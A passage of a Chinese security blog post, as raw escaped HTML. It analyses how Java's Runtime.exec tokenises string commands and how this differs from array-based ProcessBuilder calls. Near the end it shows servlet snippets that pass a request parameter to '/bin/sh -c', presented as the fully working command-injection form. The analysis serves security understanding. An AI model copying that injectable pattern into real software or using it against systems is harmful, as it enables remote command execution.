ProcessBuilder(cmd);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;pb.start();&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ul&gt;\n&lt;li&gt;使用Runtime&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;#x3C;,&gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。&lt;/p&gt;\n&lt;h1 id=\&quot;差别\&quot;&gt;差别&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#差别\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;先选择跟进&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Runtime.getRuntime().exec(cmd)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;样例代码如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;import&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; java.io.&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;*&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; class&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; Main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    public&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; static&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; void&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; main&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] &lt;/span&gt;&lt;span style=\&quot;color:#E36209;--shiki-dark:#FFAB70\&quot;&gt;arg&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;throws&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String command&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        Process proc &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Runtime.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getRuntime&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;().&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        InputStream in &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; proc.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;getInputStream&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        BufferedReader br &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt; new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; BufferedReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;new&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; InputStreamReader&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(in, &lt;/span&gt;&lt;span style=\&quot;color:#032F62;--shiki-dark:#9ECBFF\&quot;&gt;\&quot;UTF8\&quot;&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;));&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        String line &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt; null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        while&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;((line&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;=&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;br.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;readLine&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;())&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;!=&lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;            System.out.&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;println&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(line);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray[]，也就是传入一个数组。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;java\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String command, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(command, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;    }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(String cmdarray[]) throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;        return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;     }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;public&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt; Process &lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt;exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(&lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] cmdarray, &lt;/span&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;String&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;[] envp) throws IOException {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#D73A49;--shiki-dark:#F97583\&quot;&gt;    return&lt;/span&gt;&lt;span style=\&quot;color:#6F42C1;--shiki-dark:#B392F0\&quot;&gt; exec&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;(cmdarray, envp, &lt;/span&gt;&lt;span style=\&quot;color:#005CC5;--shiki-dark:#79B8FF\&quot;&gt;null&lt;/span&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span style=\&quot;color:#24292E;--shiki-dark:#E1E4E8\&quot;&gt;        }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;而根据前面代码中，我们传入的命令是如下所示：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;所以会进入&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Process exec(String command)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这个构造方法进行处理，跟进这个方法，发现最后返回&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;exec(command, null, null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String command) throws IOException {        return exec(command, null, null);    }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/22.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray[]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img __ASTRO_IMAGE_=\&quot;{&amp;#x22;src&amp;#x22;:&amp;#x22;img/23.png&amp;#x22;,&amp;#x22;alt&amp;#x22;:&amp;#x22;&amp;#x22;,&amp;#x22;loading&amp;#x22;:&amp;#x22;lazy&amp;#x22;,&amp;#x22;decoding&amp;#x22;:&amp;#x22;async&amp;#x22;,&amp;#x22;class&amp;#x22;:&amp;#x22;markdown-image&amp;#x22;,&amp;#x22;index&amp;#x22;:0}\&quot;&gt;&lt;/figure&gt;\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       throws IOException {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;       return new ProcessBuilder(cmdarray)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;          .environment(envp)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .directory(dir)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;           .start();&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。&lt;/p&gt;\n&lt;p&gt;然后继续往下走，这里调用java.lang.ProcessImpl.start。&lt;/p&gt;\n&lt;p&gt;进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。&lt;/p&gt;\n&lt;p&gt;这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c “echo 111 &gt; 3.txt”，看这两段代码的命令执行的效果。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;首先先看\n&lt;code&gt;String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;&lt;/code&gt;\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{“/bin/sh”,“-c”,\&quot;\&quot;echo”,“111”、”&gt;”,“3.txt\&quot;\&quot;}。&lt;/p&gt;\n&lt;p&gt;而当前内存开辟一个12473进程，并且确实12473执行sh命令。&lt;/p&gt;\n&lt;p&gt;但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。&lt;/p&gt;\n&lt;p&gt;也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。&lt;/p&gt;\n&lt;p&gt;下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;url\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;最后再来一段代码，下面这段代码才会是java下命令执行的完全体。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String str = request.getParameter(\&quot;cmd\&quot;);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;String\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。&lt;/p&gt;\n&lt;p&gt;最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(String... command) {        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command = new ArrayList&amp;#x3C;&gt;(command.length);        &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    for (String arg : command)            &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    this.command.add(arg);&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;   }&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;public ProcessBuilder(List&amp;#x26;lt;String&amp;#x26;gt; command) {&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    if (command == null)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;    throw new 